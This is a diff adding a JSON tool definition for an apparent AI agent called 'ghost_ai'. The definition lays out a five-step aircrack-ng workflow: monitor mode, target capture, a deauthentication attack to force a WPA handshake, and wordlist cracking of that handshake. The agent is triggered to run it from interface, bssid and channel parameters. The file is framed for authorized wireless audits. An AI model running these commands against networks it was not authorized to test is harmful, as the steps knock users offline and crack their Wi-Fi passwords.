@@ -1,0 +1,15 @@
+{
+  "tool": "aircrack-ng",
+  "ghost_ai_version": "1.0.0",
+  "category": "Wireless Security",
+  "description": "IEEE 802.11 WEP/WPA/WPA2 security assessment suite for authorized wireless audits",
+  "workflow": [
+    {"step": 1, "cmd": "airmon-ng start wlan0",              "desc": "Enable monitor mode"},
+    {"step": 2, "cmd": "airodump-ng wlan0mon",               "desc": "Capture nearby networks"},
+    {"step": 3, "cmd": "airodump-ng -c <ch> --bssid <bssid> -w /tmp/ghost_cap wlan0mon", "desc": "Target capture"},
+    {"step": 4, "cmd": "aireplay-ng --deauth 10 -a <bssid> wlan0mon", "desc": "Deauth for handshake"},
+    {"step": 5, "cmd": "aircrack-ng /tmp/ghost_cap*.cap -w wordlist.txt", "desc": "Crack WPA handshake"}
+  ],
+  "ghost_ai_trigger": "Triggered when ghost_agent receives tool=aircrack with {interface, bssid, channel} params",
+  "authorization_note": "Only use against networks you own or have explicit written authorization to audit."
+}
